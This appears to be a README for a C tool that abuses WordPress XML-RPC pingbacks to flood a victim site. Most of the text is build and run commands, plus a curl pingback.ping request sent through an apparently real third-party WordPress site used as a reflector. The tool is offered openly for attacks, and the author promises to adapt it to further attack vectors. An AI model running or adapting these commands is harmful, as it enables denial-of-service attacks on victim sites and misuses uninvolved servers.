# XML-RPC attack script

Please note, this kind of attack can only be performed on WordPress 2.1.1. WP 4.3 seems immune to this.

A complete refactor and different take on a traditional attack script for exploiting XML-RPC pingback(s) on WordPress. I've completely revamped the way that this is traditionally done, the old code/base used for attack scripts was horrible, contained memory leaks and was just overall disgusting. I'll release a guide on how to adapt this code for other attack vectors.

How to build?
```
gcc *.c -D DEBUG -pthread -o xml
```

How to Run?
'''
./xml -w http://victim/html -d 1 -t 1 -f host.txt
'''

Also this attack can be invoked through cURL:
'''
curl "http://www.selftanningguide.com/xmlrpc.php" --header "Content-Type: text/xml" --data "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim/html</string></value></param><param><value><string>http://reflector/?p=1</string></value></param></params></methodCall>"
'''
